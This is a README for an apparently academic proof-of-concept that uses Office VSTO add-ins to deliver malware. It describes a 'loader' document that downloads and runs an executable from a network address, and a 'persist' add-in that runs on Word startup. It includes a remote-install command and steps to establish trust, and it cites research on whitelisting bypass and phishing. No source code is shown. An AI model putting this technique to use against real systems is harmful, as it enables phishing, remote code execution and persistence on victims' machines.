# Visual Studio Tools For Office (VSTO) POC
​
This is a proof-of-concept created for academic/learning purposes, demonstrating both local and remote use of VSTO "Add-In's".
VSTO is a software development toolset, VSTO is available in Microsoft’s Visual Studio IDE. It enables Office Add-In’s (a type of Office application extension) to be developed in .NET and also allows for Office documents to be created that will deliver and execute these Add-In’s. 
​

https://user-images.githubusercontent.com/121618341/214397851-42e7d622-2f49-4486-bd02-f3eba3db8db2.mp4

​
## Requirements:
* Visual Studio
* Office 2016 (or later)
* An http server (optional, only required for remote delivery of VSTO)
​
## Description:
​
The POC contains 2 components - a "loader" component and a "persist" component, which can be executed and installed either locally or remotely.

## Compile and usage:
Simply copy-paste the code into the appropriate type of Visual Studio project and edit as you require.
​
### "Loader"
​
The "loader" component is intended to deliver and execute an executable from a hard-coded local network address (executable not provided. please make your own.) and install the accompanying "persist" add-in (from the same local network address) which will execute when word is executed. (you should change the network location of these in the code based upon your own environment!)
​

Local variant (all files required locally to execute) - will be outputted to ***/bin/Release/***
​

Remote variant (only Office file required locally to execute) - will be outputted to ***/Publish/*** (folder contents should be placed on delivering http server).
​
### "Persist"
​
The "persist" component is intended to execute upon Word application startup, and will deliver and execute an executable from the same local network address as the "loader", and display a msgbox.
​

Local installation (all files required locally to install) - will be outputted to ***/bin/Release/***
​

Remote installation - will be outputted to ***/Publish/***, to install: ```%commonprogramfiles%\Microsoft Shared\VSTO\10.0\vstoinstaller.exe /i <network_path_to_persist.vso>``` (folder contents should be placed on delivering http server).
​
## Establishing "trust":
​
In order to avoid easy weaponization of this POC, it's components are not signed in a trustworthy fashion, and if remote execution/installation is attempted without establishing prior "trust", it will fail.
​

If you intend on using this POC in remote fashion in your own environment please add your delivering http server to your executing machine's trusted intranet sites via Windows Internet Options or establish trust via the Windows Certificate Store.
​
## Disclaimer:
​
The code provided is offered as-is and is intended for educational or informational purposes only. The user assumes all responsibility for the use of this code and any consequences that may arise from its use. The creator of this code and its affiliates cannot be held liable for any damages or losses resulting from the use of this code
​
## Credit to prior research:
​
[https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)
​
[https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010](https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010)
